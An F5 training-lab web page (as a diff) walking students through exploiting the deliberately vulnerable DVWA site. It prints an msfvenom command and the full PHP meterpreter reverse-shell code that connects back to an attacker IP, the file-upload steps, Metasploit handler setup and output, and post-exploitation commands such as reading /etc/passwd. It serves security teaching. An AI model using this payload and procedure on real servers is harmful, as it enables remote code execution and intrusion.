@@ -1,0 +1,545 @@
+
+<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    
+    <title>2.1.2.2. Exercise 2: Exploiting a Web Server &#8212; Pwn like a Hacker; Protect like a Pro  documentation</title>
+    
+    <link rel="stylesheet" href="../../_static/css/bootstrap.min.css" type="text/css" />
+    <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+    <link rel="stylesheet" href="../../_static/css/f5_agility_theme.css" type="text/css" />
+    <link rel="stylesheet" href="../../_static/css/f5.css" type="text/css" />
+    <link rel="stylesheet" href="../../_static/css/custom.css" type="text/css" />
+    
+    <script type="text/javascript">
+      var DOCUMENTATION_OPTIONS = {
+        URL_ROOT:    '../../',
+        VERSION:     '',
+        COLLAPSE_INDEX: false,
+        FILE_SUFFIX: '.html',
+        HAS_SOURCE:  true,
+        SOURCELINK_SUFFIX: '.txt'
+      };
+    </script>
+    <script type="text/javascript" src="../../_static/jquery.js"></script>
+    <script type="text/javascript" src="../../_static/underscore.js"></script>
+    <script type="text/javascript" src="../../_static/doctools.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="2.1.2.4. Exercise 3: Metasploit Utilities" href="lab3.html" />
+    <link rel="prev" title="2.1.2.1. Exercise 1 : Scanning the Network" href="lab1.html" />
+<!--
+# Copyright 2017 F5 Networks
+#
+# Licensed under the Apache License, Version 2.0 (the "License");
+# you may not use this file except in compliance with the License.
+# You may obtain a copy of the License at
+#
+#     http://www.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed to in writing, software
+# distributed under the License is distributed on an "AS IS" BASIS,
+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+# See the License for the specific language governing permissions and
+# limitations under the License.
+-->
+<link href="https://cdn.f5.com/favicon.ico" rel="icon">
+<script src="https://use.fontawesome.com/21fb8a09c3.js"></script>
+<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+<!--[if lt IE 9]>
+  <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+<![endif]-->
+  </head>
+  <body>
+  <nav class="navbar navbar-default navbar-fixed-top">
+  <div class="container-fluid">
+    <div class="row corp-header">
+      <div class="container corp-header">
+        <div class="container corp-menu">
+          <ul>
+            <li><a href="https://f5.com" class="internalLink">F5.com</a></li>
+            <li><a href="https://support.f5.com">Support</a></li>
+            <li><a href="https://devcentral.f5.com">Community</a></li>
+            <li><a href="https://github.com/F5Networks">GitHub</a></li>
+            <li><a href="https://f5.com/about-us/careers">Careers</a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <div class="row pageHeader">
+      <div class="container stat">
+        <div class="col-xs-12 stat">
+          <a class="internalLink" href="https://f5.com">
+            <img class="logo" src="https://cdn.f5.com/websites/support/assets/images/logo.svg" width="50" height="44" alt="F5 Networks" title="F5 Networks" border="0">
+          </a>
+            <ul id="MainMenu" class="main-menu">
+              <li>
+                <a href="#">Products
+                  <span class="indicator"><span class="arrow-up"></span></span>
+                </a>
+
+                <div class="menu-panel soft-hide" id="ProductsSubmenu">
+                  <div class="container">
+                    <ul class="submenu col-sm-11">
+                      <li class="third"><span class="a-mm-h">Connectors</span>
+                        <ul>
+                          <li><a href="http://clouddocs.f5.com/products/connectors/marathon-bigip-ctlr/latest" data-link-type="Nav: Mega">F5 Marathon BIG-IP Controller</a></li>
+                          <li><a href="http://clouddocs.f5.com/products/connectors/marathon-asp-ctlr/latest" data-link-type="Nav: Mega">F5 Marathon ASP Controller</a></li>
+                          <li><a href="http://clouddocs.f5.com/products/connectors/k8s-bigip-ctlr/latest" data-link-type="Nav: Mega">F5 Kubernetes BIG-IP Controller</a></li>
+                          <li><a href="http://clouddocs.f5.com/products/connectors/f5-kube-proxy/latest" data-link-type="Nav: Mega">F5 Kubernetes Proxy</a></li>
+                        </ul>
+                        <!--span class="seemore"><a data-link-type="Nav: Mega" href="/products/connectors">See all </a></--span-->
+                      </li>
+                      <li class="divider"></li>
+                      <li class="third"><span class="a-mm-h">Application Service Proxy</span>
+                        <ul>
+                          <li><a href="http://clouddocs.f5.com/products/asp/latest" data-link-type="Nav: Mega">F5 Application Service Proxy</a></li>
+                        </ul>
+                        <!--span class="seemore"><a href="/products/">See all </a></span-->
+                      </li>
+                    </ul>
+                  </div>
+                </div>
+              </li>
+              <li>
+                <a href="#">Container Integrations
+                  <span class="indicator"><span class="arrow-up"></span></span>
+                </a>
+
+                <div class="menu-panel soft-hide" id="ContainersSubmenu">
+                  <div class="container">
+                    <ul class="submenu col-sm-11">
+                      <li class="third"><span class="a-mm-h">Container Integrations</span>
+                        <ul>
+                          <li><a href="http://clouddocs.f5.com/containers/latest/marathon/" data-link-type="Nav: Mega">Mesos Marathon</a></li>
+                          <li><a href="http://clouddocs.f5.com/containers/latest/kubernetes/" data-link-type="Nav: Mega">Kubernetes</a></li>
+                          <li><a href="http://clouddocs.f5.com/containers/latest/openshift/" data-link-type="Nav: Mega">RedHat OpenShift</a></li>
+                        </ul>
+                        <span class="seemore"><a data-link-type="Nav: Mega" href="http://clouddocs.f5.com/containers/latest">View details </a></span>
+                      </li>
+                    </ul>
+                  </div>
+                </div>
+              </li>
+              <li>
+                <a href="#">Clouds
+                  <span class="indicator"><span class="arrow-up"></span></span>
+                </a>
+
+                <div class="menu-panel soft-hide" id="CloudsSubmenu">
+                  <div class="container">
+                    <ul class="submenu col-sm-11">
+                      <li class="third"><span class="a-mm-h">Cloud Integrations</span>
+                        <ul>
+                          <li><a href="http://clouddocs.f5.com/cloud/openstack/" data-link-type="Nav: Mega">OpenStack</a></li>
+                        </ul>
+                        <!--span class="seemore"><a data-link-type="Nav: Mega" href="/cloud/">See all </a></span-->
+                      </li>
+                    </ul>
+                  </div>
+                </div>
+              </li>
+              <li>
+                <a href="#">Resources
+                  <span class="indicator"><span class="arrow-up"></span></span>
+                </a>
+                <div class="menu-panel soft-hide" id="UPCProgramSubmenu">
+                  <div class="container">
+                    <ul class="submenu col-sm-11">
+                      <li class="third">
+                        <span class="a-mm-h">Downloads</span>
+                        <ul>
+                          <li><a target="_blank" data-link-type="Nav: Mega" href="https://hub.docker.com/r/f5networks/" class="internalLink">Docker Hub</a></li>
+                          <li><a target="_blank" data-link-type="Nav: Mega" href="https://store.docker.com/images/f5networks" class="internalLink">Docker Store</a></li>
+                        </ul>
+                      </li>
+                      <li class="divider"></li>
+
+                      <li class="third">
+                        <span class="a-mm-h">OpenSource</span>
+                        <ul>
+                          <li><a target="_blank" data-link-type="Nav: Mega" href="https://github.com/F5Networks" class="internalLink">GitHub</a></li>
+                        </ul>
+                      </li>
+                      <li class="divider"></li>
+
+                      <li class="third">
+                        <a href="//university.f5.com" class="a-mm-h internalLink" target="_blank" data-link-type="Nav: Mega">F5 University</a>
+                        <ul>
+                          <li>
+                            <p>Get up to speed with free self-paced courses</p>
+                          </li>
+                        </ul>
+                        <a data-ng-href="https://devcentral.f5.com" class="a-mm-h internalLink" target="_blank" data-link-type="Nav: Mega" href="https://devcentral.f5.com">DevCentral</a>
+                        <ul>
+                          <li>
+                            <p>Join the community of 250,000+ technical peers</p>
+                          </li>
+                        </ul>
+                      </li>
+                    </ul>
+                  </div>
+                </div>
+              </li>
+            </ul>
+        </div>
+      </div>
+    </div>
+  </div> <!-- /container-fluid -->
+</nav>
+
+  <div class="container-fluid">
+    <div class="row">
+      <div class="col-sm-3 col-md-3 sidebar">
+         <h4><a href="../../">Pwn like a Hacker; Protect like a Pro </a></h4>
+<div id="searchbox" style="display: none" role="search">
+  <form class="search" action="../../search.html" method="get">
+    <div>
+      <input type="text" name="q" placeholder="Search" style="padding-left: 6px;"/>
+      <!-- <input type="submit" value="Go" style="margin-top: 4px;"/> -->
+      <button type="submit" class="btn btn-primary btn-xs">Go</button>
+    </div>
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+<script type="text/javascript">$('#searchbox').show(0);</script>
+  <p class="caption">
+   <span class="caption-text">Current Page</span>
+  </p>
+  <ul>
+<li><a class="reference internal" href="#">2.1.2.2. Exercise 2: Exploiting a Web Server</a><ul>
+<li><a class="reference internal" href="#lhost-and-lport">2.1.2.2.1. lhost and lport</a></li>
+<li><a class="reference internal" href="#exploit">2.1.2.2.2. exploit</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#meterpreter">2.1.2.3. Meterpreter</a></li>
+</ul>
+
+
+<p class="caption"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../../intro.html">1. Getting Started</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../class1.html">2. Class - Pwn like a Hacker; Protect like a Pro</a><ul class="current">
+<li class="toctree-l2 current"><a class="reference internal" href="../class1.html#class-environment">2.1. Class Environment:</a></li>
+</ul>
+</li>
+</ul>
+
+  <h4>Previous topic</h4>
+  <p class="topless"><a href="lab1.html"
+                        title="previous chapter">2.1.2.1. Exercise 1 : Scanning the Network</a></p>
+  <h4>Next topic</h4>
+  <p class="topless"><a href="lab3.html"
+                        title="next chapter">2.1.2.4. Exercise 3: Metasploit Utilities</a></p>
+        
+      </div>
+      <div class="col-md-offset-3 col-sm-offset-3 main">
+        <h4>
+          <a href="/">Community Training Classes &amp; Labs</a> &gt; <a href="../../index.html">Pwn like a Hacker; Protect like a Pro</a>
+          <span class="right"><a href="../../genindex.html">Index</a></span>
+        </h4>
+        
+  <div class="section" id="exercise-2-exploiting-a-web-server">
+<h1>2.1.2.2. Exercise 2: Exploiting a Web Server<a class="headerlink" href="#exercise-2-exploiting-a-web-server" title="Permalink to this headline">¶</a></h1>
+<p>This exploit uses some of the basic functions of the DVWA web site to
+demonstrate how to hack through the site itself. A hacker would use this
+as a means of circumventing your perimeter to gain access to your
+applications, servers and data.</p>
+<p>We will start by creating a pre-canned piece of php code that we will
+upload to the web server through the upload function on DVWA. For this
+exercise you will need to locate the external IP for your Kali server.
+This IP is generated dynamically for each student but we have written a
+script and an iRule on the CTF server to return the IP address you’ll
+need.</p>
+<p>On the Kali server, run the following:</p>
+<p>msfvenom -p php/meterpreter/reverse_tcp lport=4444 -f raw lhost=`curl
+-k <a class="reference external" href="https://ctf.f5lab.biz/whatismyip">https://ctf.f5lab.biz/whatismyip</a>`</p>
+<p>% Total % Received % Xferd Average Speed Time Time Time Current</p>
+<p>Dload Upload Total Spent Left Speed</p>
+<p>100 14 100 14 0 0 492 0 –:–:– –:–:– –:–:– 518</p>
+<p>No platform was selected, choosing Msf::Module::Platform::PHP from the
+payload</p>
+<p>No Arch selected, selecting Arch: php from the payload</p>
+<p>No encoder or badchars specified, outputting raw payload</p>
+<p>Payload size: 950 bytes</p>
+<p>/*&lt;?php /**/ error_reporting(0); $ip = ‘&lt;YOUR-IP&gt;’; $port = 4444; if
+(($f = ‘stream_socket_client’) &amp;&amp; is_callable($f)) { $s =
+$f(“<a class="reference external" href="tcp:/">tcp:/</a>/{$ip}:{$port}”); $s_type = ‘stream’; } elseif (($f =
+‘fsockopen’) &amp;&amp; is_callable($f)) { $s = $f($ip, $port); $s_type =
+‘stream’; } elseif (($f = ‘socket_create’) &amp;&amp; is_callable($f)) { $s =
+$f(AF_INET, SOCK_STREAM, SOL_TCP); $res = &#64;socket_connect($s, $ip,
+$port); if (!$res) { die(); } $s_type = ‘socket’; } else { die(‘no
+socket funcs’); } if (!$s) { die(‘no socket’); } switch ($s_type) {
+case ‘stream’: $len = fread($s, 4); break; case ‘socket’: $len =
+socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack(“Nlen”,
+$len); $len = $a[‘len’]; $b = ”; while (strlen($b) &lt; $len) { switch
+($s_type) { case ‘stream’: $b .= fread($s, $len-strlen($b)); break;
+case ‘socket’: $b .= socket_read($s, $len-strlen($b)); break; } }
+$GLOBALS[‘msgsock’] = $s; $GLOBALS[‘msgsock_type’] = $s_type;
+eval($b); die();</p>
+<p>Highlight the section of code that was generated – from the “/*&lt;?php”
+to the end “die;”</p>
+<p>Open a Command prompt on the Windows PC. In the command prompt type:</p>
+<p>CD Desktop</p>
+<p>Notepad hackdvwa.php</p>
+<img alt="../../_images/cmd1.png" src="../../_images/cmd1.png" />
+<p>In Notepad, paste the copied code and Save and Close the file.</p>
+<img alt="../../_images/notepad.png" src="../../_images/notepad.png" />
+<p>Open a Web Browser and go to <a class="reference external" href="https://dvwa.vlab.f5demo.com">https://dvwa.vlab.f5demo.com</a></p>
+<p>Log in with admin / password</p>
+<p>Choose the Upload menu on the lower left</p>
+<img alt="../../_images/dvwa.png" src="../../_images/dvwa.png" />
+<p>Click ‘Choose File’ and select the hackdvwa.php file you just created on
+the Desktop and click ‘Upload’</p>
+<img alt="../../_images/explorer.png" src="../../_images/explorer.png" />
+<img alt="../../_images/upload.png" src="../../_images/upload.png" />
+<p>The file is then posted to the server and the location is displayed for
+you as a means of confirmation. You can copy this and paste it at the
+end of the URL in the browser.</p>
+<p>In the browser, visit that file’s location:
+<a class="reference external" href="http://dvwa.vlab.f5demo.com/hackable/uploads/hackdvwa.php">http://dvwa.vlab.f5demo.com/hackable/uploads/hackdvwa.php</a></p>
+<p>This will actually fail and you should see a “no socket” message, but
+we’ll set that up next.</p>
+<p>Back to the Kali ssh session we will set up the server to connect to
+from the web server.</p>
+<p>If you’re not within msfconsole anymore, start it:</p>
+<p>msfconsole</p>
+<p>Now we want to choose an exploit to run.</p>
+<p>use exploit/multi/handler</p>
+<p>To see what is selected for this exploit by default, type:</p>
+<p>options</p>
+<p>Module options (exploit/multi/handler):</p>
+<p>Name Current Setting Required Description</p>
+<p>—- ————— ——– ———–</p>
+<p>Exploit target:</p>
+<p>Id Name</p>
+<p>– —-</p>
+<p>0 Wildcard Target</p>
+<p>this selects the exploit we’ll run in Metasploit</p>
+<p>set payload php/meterpreter/reverse_tcp</p>
+<p>To see the options for this payload, type:</p>
+<p>options</p>
+<p>Module options (exploit/multi/handler):</p>
+<p>Name Current Setting Required Description</p>
+<p>—- ————— ——– ———–</p>
+<p>Payload options (php/meterpreter/reverse_tcp):</p>
+<p>Name Current Setting Required Description</p>
+<p>—- ————— ——– ———–</p>
+<p>LHOST yes The listen address</p>
+<p>LPORT 4444 yes The listen port</p>
+<p>Exploit target:</p>
+<p>Id Name</p>
+<p>– —-</p>
+<p>0 Wildcard Target</p>
+<p>This chooses the actual payload we’re going to send through the exploit
+and we’ll set some parameters. To see the options:</p>
+<p>show options</p>
+<p>msf exploit(handler) &gt; set payload php/meterpreter/reverse_tcp</p>
+<p>payload =&gt; php/meterpreter/reverse_tcp</p>
+<p>msf exploit(handler) &gt; show options</p>
+<p>Module options (exploit/multi/handler):</p>
+<p>Name Current Setting Required Description</p>
+<p>—- ————— ——– ———–</p>
+<p>Payload options (php/meterpreter/reverse_tcp):</p>
+<p>Name Current Setting Required Description</p>
+<p>—- ————— ——– ———–</p>
+<p>LHOST yes The listen address</p>
+<p>LPORT 4444 yes The listen port</p>
+<p>Exploit target:</p>
+<p>Id Name</p>
+<p>– —-</p>
+<p>0 Wildcard Target</p>
+<p>Set the options as follows:</p>
+<p>set lhost 10.1.10.240</p>
+<p>set lport 4444</p>
+<div class="section" id="lhost-and-lport">
+<h2>2.1.2.2.1. lhost and lport<a class="headerlink" href="#lhost-and-lport" title="Permalink to this headline">¶</a></h2>
+<p>These options are the ‘local’ listening IP and port for the exploit.
+Note that the IP here is the internal NAT’d IP address. In the above php
+code you entered the External NAT’d address.</p>
+<p>Return to your web browser on the Windows PC and refresh the page.</p>
+<p>Now we can start the server:</p>
+<p>exploit</p>
+</div>
+<div class="section" id="exploit">
+<h2>2.1.2.2.2. exploit<a class="headerlink" href="#exploit" title="Permalink to this headline">¶</a></h2>
+<p>Exploit is the fun command… here we are running the exploit we want to
+see. You can also use ‘run’ but exploit is so much more Hacker.</p>
+<p>After a few seconds, you should see:</p>
+<p>[*] Started reverse TCP handler on 10.1.10.240:4444</p>
+<p>[*] Starting the payload handler…</p>
+<p>[*] Sending stage (33986 bytes) to &lt;YOURIP&gt;</p>
+<p>[*] Meterpreter session 3 opened (10.1.10.240:4444 -&gt; &lt;IP&gt;:PORT) at
+&lt;Date&gt;</p>
+<p>And then a moment or two later:</p>
+<p>meterpreter &gt;</p>
+</div>
+</div>
+<div class="section" id="meterpreter">
+<h1>2.1.2.3. Meterpreter<a class="headerlink" href="#meterpreter" title="Permalink to this headline">¶</a></h1>
+<p>Meterpreter is the “Swiss Army Knife” of the Metasploit Framework. You
+can open a meterpreter console up through an exploit, like we just did.
+In this case, we set up Metasploit to listen for incoming traffic on
+port 4444 on our NAT’d internet address. We had to do this because the
+DMZ address isn’t accessible by the Web Server but it is allowed to
+connect to the internet. We then run the uploaded php code we generated
+which opens the connection and now we’re able to run commands on the web
+server as though we had an ssh-like connection.</p>
+<p>Let’s examine the web server so see what we can find.</p>
+<p>In the Meterpreter shell type:</p>
+<p>dir</p>
+<p>We can the following:</p>
+<p>meterpreter &gt; dir</p>
+<p>Listing: /var/www/dvwa/hackable/uploads</p>
+<hr class="docutils" />
+<p>Mode Size Type Last modified Name</p>
+<p>—- —- —- ————- —-</p>
+<p>100644/rw-r–r– 667 fil 2013-07-08 12:55:06 -0400 dvwa_email.png</p>
+<p>100644/rw-r–r– 950 fil 2017-06-19 09:11:52 -0400 hackdvwa.php</p>
+<p>100644/rw-r–r– 951 fil 2017-06-14 13:50:15 -0400 hackme.php.txt</p>
+<p>We can see what accounts are on this server by typing:</p>
+<p>cat /etc/passwd</p>
+<p>To see a list of the commands that are available to you, you can type
+<em>help</em> at any point</p>
+<p>Feel free to investigate the web server, when you’re finished type
+<em>exit</em> and the Meterpreter shell will close.</p>
+<p>Note that when you close the session, the web page finally ends
+spinning.</p>
+</div>
+
+
+        
+		     <div class="row next-prev-btn-row">
+           <div class="col-lg-12">
+           
+		        <a href="lab1.html" title="2.1.2.1. Exercise 1 : Scanning the Network" accesskey="p" class="btn btn-primary pull-left"><i class="fa fa-arrow-circle-left" aria-hidden="true"></i> Previous</a>
+           
+           
+              <a href="lab3.html" title="2.1.2.4. Exercise 3: Metasploit Utilities" accesskey="n" class="btn btn-primary pull-right">Next <i class="fa fa-arrow-circle-right" aria-hidden="true"></i></a>
+           
+		     </div>
+         </div>
+        
+      </div>
+    </div>
+  </div>
+
+
+  <footer>
+      <div class="container-fluid">
+        <div class="row">
+          <div class="content-fluid pre-footer">
+            <div class="blocks-container">
+              <div class="block">
+                <h3>Support Programs</h3>
+                <p>Regionally located support centers enable F5 to provide support in a number of languages through native-speaking support engineers.</p>
+                <a class="btn internalLink" data-ng-href="https://f5.com/support/support-offerings" target="_blank" href="https://f5.com/support/support-offerings">See more
+                  <span class="icon-1x-right icon-new-window" data-icon="new-window">​</span>
+                </a>
+              </div>
+              <div class="block">
+                <h3>Contact Support</h3>
+                <p>
+                  North America: 1-888-882-7535<br>
+                  Outside North America: 800-11-275-435
+                </p>
+                <a class="btn internalLink" data-ng-href="https://f5.com/about-us/contact#regional-support" target="_blank" href="https://f5.com/about-us/contact#regional-support">Local Support Numbers
+                  <span class="icon-1x-right icon-new-window" data-icon="new-window">​</span>
+                </a>
+              </div>
+              <div class="block">
+                <h3>Feedback and Help</h3>
+                <p>Have questions, suggestions, or just want to get something off your chest? Let us know.</p>
+                <a class="btn" data-ui-sref="siteFeedback" target="_blank" href="https://support.f5.com/csp/siteFeedback">Leave feedback</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="row">
+          <div class="footer">
+            <div class="container">
+              <div class="col-sm-3 col-md-2">
+                <h4>About F5</h4>
+                <ul>
+                  <li><a data-ng-href="https://f5.com/about-us/contact" target="_blank" data-link-type="footer" href="https://f5.com/about-us/contact" class="internalLink">Contact F5</a>
+                  </li>
+                  <li><a data-ng-href="https://f5.com/about-us/careers" target="_blank" data-link-type="footer" href="https://f5.com/about-us/careers" class="internalLink">Careers</a>
+                  </li>
+                </ul>
+              </div>
+              <div class="col-sm-3 col-md-2">
+                <h4>Education</h4>
+                <ul>
+                  <li><a data-ng-href="https://f5.com/education/training" target="_blank" data-link-type="footer" href="https://f5.com/education/training" class="internalLink">Training</a>
+                  </li>
+                  <li><a data-ng-href="https://f5.com/education/certification" target="_blank" data-link-type="footer" href="https://f5.com/education/certification" class="internalLink">Certification</a>
+                  </li>
+                  <li><a data-ng-href="https://f5.com/education/training/free-courses" target="_blank" data-link-type="footer" href="https://f5.com/education/training/free-courses" class="internalLink">Free Online Training</a>
+                  </li>
+                </ul>
+              </div>
+
+              <div class="col-sm-3 col-md-2">
+                <h4>F5 sites</h4>
+                <ul>
+                <li><a data-ng-href="https://f5.com" target="_blank" data-link-type="footer" href="https://f5.com" class="internalLink">F5.com</a>
+                </li>
+                <li><a data-ng-href="https://devcentral.f5.com" target="_blank" data-link-type="footer" href="https://devcentral.f5.com" class="internalLink">Community</a>
+                </li>
+                <li><a data-ng-href="https://partners.f5.com" target="_blank" data-link-type="footer" href="https://partners.f5.com" class="internalLink">Partners</a>
+                </li>
+            </ul>
+        </div>
+
+        <div class="col-sm-3 col-md-2">
+            <h4>Support Tasks</h4>
+            <ul>
+                <li><a data-ui-sref="mySupport.createServiceRequest" data-link-type="footer" href="https://support.f5.com/csp/my-support/service-request">Create Service Request </a>
+                </li>
+                <li><a data-ng-href="https://f5.com/about-us/contact#regional-support" target="_blank" data-link-type="footer" href="https://f5.com/about-us/contact#regional-support" class="internalLink">Contact Support</a>
+                </li>
+                <li><a data-ui-sref="siteFeedback" target="_blank" data-link-type="footer" href="https://support.f5.com/csp/siteFeedback">Leave feedback [+]</a>
+                </li>
+            </ul>
+        </div>
+
+        <div class="col-xs-12 col-md-3 right">
+            <h4>Connect with us</h4>
+            <ul class="social_icons">
+                <li><a href="//twitter.com/f5networks" target="_blank" data-name="twitter" data-type="" data-prefix="social" data-utf="E032" title="Twitter" class="externalLink"><i class="icon-1x icon-twitter icon-inverse-circle" data-link-type="footer"></i></a></li>
+                <li><a href="//www.linkedin.com/companies/f5-networks" target="_blank" class="linkedin externalLink" title="LinkedIn"><i class="icon-1x icon-linkedin icon-inverse-circle" data-link-type="footer"></i></a></li>
+                <li><a href="//www.facebook.com/f5networksinc" target="_blank" class="facebook externalLink" title="Facebook"><i class="icon-1x icon-facebook icon-inverse-circle" data-link-type="footer"></i></a></li>
+                <li><a href="//www.youtube.com/f5networksinc" target="_blank" class="youtube externalLink" title="YouTube"><i class="icon-1x icon-youtube icon-inverse-circle" data-link-type="footer"></i></a></li>
+                <li><a data-ng-href="https://devcentral.f5.com" target="_blank" class="devcentral internalLink" title="DevCentral" href="https://devcentral.f5.com"><i class="icon-1x icon-dc-pos icon-inverse-circle" data-link-type="footer"></i></a></li>
+            </ul>
+        </div>
+
+        <div class="content-fluid left">
+            <div class="col-xs-12">
+                <p>
+                    © Copyright <span class="ng-binding">2017</span> by F5 Networks, Inc. |
+                    <a data-ng-href="https://f5.com/about-us/policies" target="_blank" data-link-type="footer" href="https://f5.com/about-us/policies" class="internalLink">Policies</a> |
+                    <a data-ng-href="https://f5.com/about-us/policies/trademarks" target="_blank" data-link-type="footer" href="https://f5.com/about-us/policies/trademarks" class="internalLink">Trademarks</a>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+    </div>
+</div>
+</footer>
+  <!-- Bootstrap core JavaScript
+  ================================================== -->
+  <!-- Placed at the end of the document so the pages load faster -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+  <script src="../../_static/js/bootstrap.min.js"></script>
+  <script type="text/javascript">
+    jQuery.noConflict(true)
+  </script>
+  </body>
+</html>
